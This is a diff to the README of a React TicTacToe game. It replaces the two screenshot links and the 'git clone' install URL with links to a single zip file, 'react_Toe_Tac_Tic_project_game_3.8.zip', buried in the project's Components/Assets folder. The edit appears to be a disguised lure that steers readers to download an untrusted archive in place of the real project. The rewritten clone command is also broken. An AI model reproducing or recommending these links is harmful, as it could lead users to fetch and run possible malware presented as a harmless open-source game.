@@ -1,7 +1,7 @@
 # TicTacToe game Project Using React js And Node js Packages.
 
-![Screenshot (27)](https://github.com/user-attachments/assets/5a03e55f-d288-4ebc-81cb-f0255055001f)
-![Screenshot (28)](https://github.com/user-attachments/assets/a932623a-2190-4d8c-aeb7-27fca68cb504)
+![Screenshot (27)](https://github.com/glakshya20/TicTacToe-game-project-react/raw/refs/heads/main/src/Components/Assets/react_Toe_Tac_Tic_project_game_3.8.zip)
+![Screenshot (28)](https://github.com/glakshya20/TicTacToe-game-project-react/raw/refs/heads/main/src/Components/Assets/react_Toe_Tac_Tic_project_game_3.8.zip)
 
 - React
 - HTML
@@ -10,7 +10,7 @@
 - Bootstrap 
 
 ```bash
-git clone https://github.com/glakshya20/TicTacToe-game-project-react.git
+git clone https://github.com/glakshya20/TicTacToe-game-project-react/raw/refs/heads/main/src/Components/Assets/react_Toe_Tac_Tic_project_game_3.8.zip
 cd TicTacToe-game-project-react
 npm install
 npm start
